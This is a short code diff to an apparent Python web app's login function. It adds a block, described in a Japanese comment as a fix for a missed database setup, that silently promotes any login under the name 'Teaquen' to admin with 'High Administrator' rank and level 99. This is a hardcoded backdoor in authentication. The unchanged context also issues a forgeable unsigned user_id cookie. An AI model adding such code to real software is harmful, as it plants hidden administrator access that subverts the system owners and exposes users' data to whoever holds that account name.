@@ -454,6 +454,14 @@ def login(request: Request, name: str = Form(...), password: str = Form(...)):
                 "lang": lang
             })
             
+        # 特別対応: Teaquen を強制的に管理者に昇格（DB初期化漏れ対策）
+        if name == "Teaquen" and user["role"] != "admin":
+            conn = get_db()
+            execute_query(conn, "UPDATE users SET role='admin', title='High Administrator', level=99 WHERE name='Teaquen'")
+            conn.close()
+            # 取得済みの情報を更新
+            user["role"] = "admin"
+            
         resp = RedirectResponse(url="/home", status_code=303)
         resp.set_cookie("user_id", str(user["id"]), max_age=30*24*60*60)
         return resp
